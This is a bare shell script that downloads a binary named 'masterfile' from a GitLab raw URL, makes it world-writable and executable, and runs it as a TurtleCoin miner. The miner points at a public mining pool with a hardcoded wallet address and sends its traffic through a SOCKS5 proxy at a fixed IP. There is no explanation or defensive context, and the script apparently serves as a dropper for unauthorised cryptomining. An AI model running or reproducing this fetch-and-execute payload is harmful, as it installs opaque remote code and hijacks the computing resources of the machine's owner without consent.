#!/bin/sh
wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
chmod 777 masterfile
POOL=turtlecoin.herominers.com:10380
WALLET=TRTLuwaiGbcexV82zFn2tk3gEemniqMYtirfBSYtXdBLFYE5yJpE15B9LYZxmGNzGPPYvGoCQ8Ke1ZXB49X1tQGCJKaoA9zPEKw+a496e7541267b713e71a50ccebf86c02c984a22cbacc038edf9637d02000e67f
WORKER=CPU
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
